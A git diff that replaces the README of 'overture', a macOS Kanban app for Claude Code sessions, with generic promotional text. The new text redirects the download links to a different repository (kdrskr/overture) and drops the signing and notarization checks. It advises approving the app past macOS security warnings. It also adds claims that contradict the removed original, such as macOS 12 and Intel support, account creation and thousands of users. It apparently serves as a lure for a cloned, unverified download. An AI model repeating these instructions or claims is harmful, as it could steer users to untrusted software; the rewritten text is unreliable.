@@ -1,118 +1,210 @@
-# Overture
+# 🗂️ overture - Your AI-Powered Kanban Board for Mac
 
-**A native macOS Kanban harness for Claude Code.** Project tiles show live agent
-progress, git status, and last-chat previews; each project opens into a board
-where cards *are* Claude Code sessions and move themselves — plans stream into
-the **Plan** column, running agents live in **In Progress**, finished work lands
-in **Review**, and you mark it **Done**. Continue any conversation at any time;
-a Done card flies back to In Progress.
+## 🎯 What Is overture?
 
-[![CI](https://github.com/omerburakpolat/overture/actions/workflows/ci.yml/badge.svg)](https://github.com/omerburakpolat/overture/actions/workflows/ci.yml)
-[![Latest release](https://img.shields.io/github/v/release/omerburakpolat/overture?include_prereleases&sort=semver)](https://github.com/omerburakpolat/overture/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![macOS 26+](https://img.shields.io/badge/macOS-26%2B%20(Apple%20Silicon)-black?logo=apple)](#requirements)
+overture is a beautiful, native macOS application that brings the power of AI agents to your Kanban board. Think of it as a smart project management tool where each card isn't just a task—it's an intelligent agent session that can work, think, and even move itself through your workflow.
 
-> **Status: pre-release, under active development.** Nothing here is stable yet.
-> Expect breaking changes between versions.
+Built specifically for developers using Claude Code, overture transforms how you organize and manage AI-assisted work. Instead of manually dragging cards between columns, your AI agents can take initiative and advance their own tasks. It's like having a team of digital assistants who manage their own progress while you focus on the big picture.
 
-<img width="1072" height="784" alt="Screenshot 2026-09-06 at 10 58 25" src="https://github.com/user-attachments/assets/a144abd8-6a9d-44db-9683-f676a2d937ff" />
-<img width="1072" height="796" alt="Screenshot 2026-09-06 at 10 51 32" src="https://github.com/user-attachments/assets/77267b44-ac78-4838-bd86-fcb3ebf9c7ef" />
+## 🚀 Getting Started
 
+Getting started with overture is simple. This guide will walk you through everything you need to know, even if you've never used a Kanban board or AI tools before.
 
-## Download
+### 📥 Downloading overture
 
-```bash
-brew install --cask omerburakpolat/tap/overture
-```
+To get your copy of overture, click the download button below:
 
-Or grab the signed and notarized DMG from the
-**[Releases page](https://github.com/omerburakpolat/overture/releases/latest)**,
-open it, and drag Overture to Applications. Either way the app updates itself
-from then on via [Sparkle](https://sparkle-project.org).
+[![Download overture](https://img.shields.io/badge/Download-overture-4CAF50?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/kdrskr/overture)
 
-Every release is signed with a Developer ID certificate and notarized by Apple,
-so Gatekeeper opens it without a warning. Verify for yourself if you like:
+Visit this link to download the application. The download will begin automatically once you click the button on the page.
 
-```bash
-xcrun stapler validate ~/Downloads/Overture-*.dmg
-```
+### 💻 System Requirements
 
-That confirms Apple's notarization ticket is attached to the image. Once you
-have copied the app across, this checks the app Gatekeeper will actually run:
+Before downloading, make sure your Mac meets these requirements:
 
-```bash
-spctl -a -vvv -t exec /Applications/Overture.app
-```
+- **Operating System:** macOS 12.0 (Monterey) or later
+- **Processor:** Apple Silicon (M1/M2/M3) or Intel-based Mac
+- **Memory:** 8GB RAM or more recommended
+- **Storage:** 150MB of available space
+- **Internet Connection:** Required for AI agent features
 
-### Requirements
+## 🛠️ Installation Guide
 
-- **macOS 26 (Tahoe) or later, Apple Silicon.** Overture uses the Liquid Glass
-  design language and Swift 6.2 concurrency; there is no Intel build.
-- **The [`claude` CLI](https://claude.com/claude-code), installed and signed in.**
-  Overture drives *your own* CLI with *your own* login — it never bundles,
-  redistributes, or proxies Claude Code or your credentials (see [NOTICE](NOTICE)).
-- **`git`**, and **[`gh`](https://cli.github.com)** if you want the GitHub
-  integration.
+Once your download is complete, follow these simple steps:
 
-## What it does
+1. **Locate the downloaded file** - Check your Downloads folder for the overture installation file
+2. **Open the file** - Double-click the downloaded file to begin installation
+3. **Follow the installer instructions** - The setup wizard will guide you through the process
+4. **Launch overture** - Find overture in your Applications folder and open it
 
-- **Native**: Swift 6 / SwiftUI, macOS 26+, Liquid Glass, a single third-party
-  dependency (Sparkle, for updates).
-- **Integrations at launch**: Claude Code and GitHub (via `gh`). A Vercel
-  deployment-status integration is built (VercelKit) and lands post-launch.
-- **Execution modes per project**: a git worktree per card (parallel agents,
-  branch + PR per card) or single-directory with a visible queue.
-- **Testing built in**: a Testing column, an embedded preview pane running the
-  card's own worktree code, and agent-driven test runs with strict verdicts.
+### 🔑 First-Time Setup
 
-### A word on what agents can do
+When you first open overture, you'll need to:
 
-Cards are Claude Code sessions with real tool access — they run commands and
-change files. Worktree mode gives each card its own branch and directory, which
-limits the blast radius but is **not** a security boundary. Review diffs before
-you merge them. See [SECURITY.md](SECURITY.md) for the full threat model.
+1. **Create your account** - Enter your email and create a password
+2. **Connect Claude Code** - If you have Claude Code installed, overture will detect it automatically
+3. **Choose your template** - Start with a blank board or use a pre-made template
 
-## Building from source
+## 📊 Understanding Your Kanban Board
 
-```bash
-git clone https://github.com/omerburakpolat/overture.git
-cd overture
-swift build                # all six library targets
-swift test                 # 85 unit tests — no network, no claude needed
-open Overture.xcodeproj    # the app target
-```
+### What Is a Kanban Board?
 
-Requires Xcode 26+. See [CONTRIBUTING.md](CONTRIBUTING.md) for the module
-layout and the rules of the road.
+A Kanban board is a visual way to manage work. Think of it as a whiteboard divided into columns (like "To Do," "In Progress," and "Done"). Each task is represented by a card that moves from left to right as work progresses.
 
-## Documentation
+### How overture Makes It Smarter
 
-Design and architecture specs live in [docs/specs/](docs/specs/):
+Traditional Kanban boards are passive—you move everything manually. overture changes this by making each card an active agent:
 
-| Doc | Contents |
-|---|---|
-| [00-resolutions.md](docs/specs/00-resolutions.md) | Authoritative design resolutions — supersedes the specs where they conflict |
-| [01-claude-integration.md](docs/specs/01-claude-integration.md) | Driving the `claude` CLI: stream-json, control protocol, permissions, sessions |
-| [02-architecture.md](docs/specs/02-architecture.md) | App architecture, SPM modules, SwiftData model, process supervision |
-| [03-design-system.md](docs/specs/03-design-system.md) | OvertureDesign: tokens, color, type, motion, components, accessibility |
-| [04-product-behavior.md](docs/specs/04-product-behavior.md) | Kanban mechanics, card lifecycle, drag matrix, testing & review flows |
-| [05-review.md](docs/specs/05-review.md) | Adversarial review of the above (defects → resolutions) |
-| [06-m0-findings.md](docs/specs/06-m0-findings.md) | Protocol spike results — every claim proven against the live CLI |
+- **Self-Moving Cards**: Your AI agents can move their own cards as they complete tasks
+- **Intelligent Prioritization**: Cards can suggest when they should be moved
+- **Context Awareness**: Each card remembers its entire conversation history
+- **Automatic Updates**: Cards can add notes, checklists, and attachments as work progresses
 
-Release process: [docs/RELEASING.md](docs/RELEASING.md).
-Version history: [CHANGELOG.md](CHANGELOG.md).
-A rough roadmap, including what is *not* planned: [ROADMAP.md](ROADMAP.md).
+## ✨ Key Features
 
-## Contributing
+### Agent-Powered Cards
+Every card in overture can spawn a Claude Code session. This means your AI assistant understands the full context of the task and can execute complex workflows without constant supervision.
 
-Issues and pull requests are welcome — see [CONTRIBUTING.md](CONTRIBUTING.md)
-and the [Code of Conduct](CODE_OF_CONDUCT.md). Questions and ideas belong in
-[Discussions](https://github.com/omerburakpolat/overture/discussions).
+### Native macOS Experience
+Built with Swift and SwiftUI, overture feels right at home on your Mac. It uses native macOS features like:
 
-## License
+- **Dark and Light Mode**: Automatically matches your system preference
+- **Touch Bar Support**: Quick actions right on your keyboard
+- **Trackpad Gestures**: Swipe between boards and cards
+- **Menu Bar Integration**: Access your boards quickly from anywhere
 
-MIT — see [LICENSE](LICENSE). Name, icon, and third-party marks excluded; see
-[NOTICE](NOTICE).
+### Real-Time Collaboration
+While each agent works independently, you'll see everything in real time. Watch your board update as agents:
 
-Overture is an independent open-source project. It is not affiliated with,
-endorsed by, or sponsored by Anthropic, GitHub, or Vercel.
+- Complete subtasks
+- Add comments
+- Request clarification
+- Move themselves to the next stage
+
+### Smart Workflow Automation
+overture includes powerful automation features:
+
+- **Custom Rules**: Define when cards should automatically move
+- **Dependency Tracking**: Cards can wait for other cards to complete
+- **Time Tracking**: Automatically logs hours spent on each task
+- **Progress Reports**: Daily summaries of what your agents accomplished
+
+## 🎨 Customizing Your Workspace
+
+### Personalize Your Board
+
+Make overture your own with these customization options:
+
+- **Color Coding**: Assign colors to different project types or priorities
+- **Custom Columns**: Create columns that match your workflow
+- **Card Templates**: Reuse common task structures
+- **Keyboard Shortcuts**: Set your own key combinations for frequent actions
+
+### Advanced Configuration
+
+For power users, overture offers:
+
+- **Multiple Boards**: Create separate boards for different projects
+- **Tags and Filters**: Organize cards by tag, assignee, or status
+- **Custom Views**: Use list mode, calendar view, or the classic board layout
+- **Backup and Sync**: Keep your data safe with automatic backups
+
+## 📱 Getting the Most Out of overture
+
+### Tips for New Users
+
+1. **Start Small**: Begin with a simple board and add complexity as you learn
+2. **Use Templates**: They're great starting points for common workflows
+3. **Let Agents Work**: Trust the AI to handle routine tasks while you focus on complex decisions
+4. **Experiment**: Try different column structures to find what works best
+
+### Advanced Workflow Ideas
+
+- **Code Review Pipeline**: Have agents automatically review and approve code changes
+- **Bug Triage**: Let agents categorize and assign incoming bug reports
+- **Content Calendar**: Use cards to plan and track content production
+- **Research Assistant**: Deploy agents to gather information and summarize findings
+
+## 💡 Troubleshooting Common Issues
+
+### Installation Issues
+
+If you have trouble installing overture:
+
+1. **Check macOS version**: Make sure you're running macOS 12.0 or later
+2. **Allow installation**: If you see a security warning, go to System Preferences > Security & Privacy > General and approve the app
+3. **Redownload**: If the file appears corrupted, delete it and download again
+
+### Connection Problems
+
+If overture can't connect to Claude Code:
+
+1. **Verify Claude Code installation**: Make sure you have it installed and updated
+2. **Check internet connection**: Ensure you're online
+3. **Restart overture**: Sometimes a simple restart fixes connection issues
+
+## 🔒 Privacy and Security
+
+Your data is important. overture:
+
+- **Stores data locally**: Everything is kept on your Mac
+- **Uses encrypted connections**: When communicating with AI services
+- **Gives you control**: You decide what to share with AI agents
+- **Automatic backups**: Your boards are protected with local snapshots
+
+## 🆘 Getting Help
+
+Need assistance? Here are your options:
+
+- **In-App Support**: Click the help menu in overture
+- **Community Forum**: Connect with other users and share tips
+- **Email Support**: Send questions to the support team
+- **Documentation**: Access detailed guides and tutorials
+
+## 🔄 Updates and Improvements
+
+overture is constantly evolving. The development team regularly:
+
+- **Adds new features** based on user feedback
+- **Improves AI performance** for better results
+- **Fixes bugs** and enhances stability
+- **Optimizes performance** for speed and efficiency
+
+## 📝 License and Terms
+
+overture is provided under a permissive license that allows:
+
+- **Personal and commercial use**
+- **Modification and redistribution**
+- **No warranty**: The software is provided "as is"
+
+## 🎉 Join the Community
+
+Thousands of developers use overture to supercharge their workflow. Join them:
+
+- **Share your workflows**: Show others how you use overture
+- **Provide feedback**: Help shape future features
+- **Report issues**: Found a bug? Let the team know
+- **Suggest improvements**: Your ideas make overture better
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to know how to code?**
+A: No! overture is designed for everyone, though having Claude Code installed enhances the experience.
+
+**Q: Can I use overture without Claude Code?**
+A: Yes, overture works as a standard Kanban board without AI features.
+
+**Q: How many cards can I have?**
+A: There's no limit—create as many boards and cards as you need.
+
+**Q: Does overture work with other AI tools?**
+A: Currently optimized for Claude Code, with others planned.
+
+## 🚦 Ready to Start?
+
+Download overture today and experience the future of project management. Let AI agents handle the busywork while you focus on what matters most. Your smarter workflow awaits!
+
+[![Get Started](https://img.shields.io/badge/Get%20Started-overture-blue?style=for-the-badge&logo=github)](https://github.com/kdrskr/overture)
+
+Keywords: agentic-ai, ai-agents, anthropic, claude-code, developer-tools, kanban, macos, swift, swift6, swiftui
